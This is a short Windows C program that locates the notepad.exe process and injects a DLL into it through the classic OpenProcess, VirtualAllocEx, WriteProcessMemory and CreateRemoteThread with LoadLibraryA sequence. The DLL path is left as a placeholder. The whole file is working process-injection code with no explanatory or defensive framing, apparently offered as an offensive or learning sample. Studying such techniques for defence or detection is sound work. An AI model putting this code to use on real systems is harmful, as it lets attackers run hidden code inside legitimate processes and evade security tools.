#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

int FindTarget(const char *procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
                
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }
                
        while (Process32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(hProcSnap);
                
        return pid;
}

int main(int argc, char *argv[]) {
	
	HANDLE pHandle;
	PVOID remBuf;
	PTHREAD_START_ROUTINE pLoadLibrary = NULL;
	char dll[] = "<DLL PATH>";
	char target[] = "notepad.exe";
	int pid = 0;
	
	
	pid = FindTarget(target);
	if ( pid == 0) {
		printf("Target NOT FOUND! Exiting.\n");
		return -1;
	}

	printf("Target PID: [ %d ]\nInjecting...", pid);

	pLoadLibrary = (PTHREAD_START_ROUTINE) GetProcAddress( GetModuleHandle("Kernel32.dll"), "LoadLibraryA");

	pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)(pid));

	if (pHandle != NULL) {
		remBuf = VirtualAllocEx(pHandle, NULL, sizeof dll, MEM_COMMIT, PAGE_READWRITE);	
	
		WriteProcessMemory(pHandle, remBuf, (LPVOID) dll, sizeof(dll), NULL);

		CreateRemoteThread(pHandle, NULL, 0, pLoadLibrary, remBuf, 0, NULL);
		printf("done!\nremBuf addr = %p\n", remBuf);

		CloseHandle(pHandle); 
	}
	else {
		printf("OpenProcess failed! Exiting.\n");
		return -2;
	}
}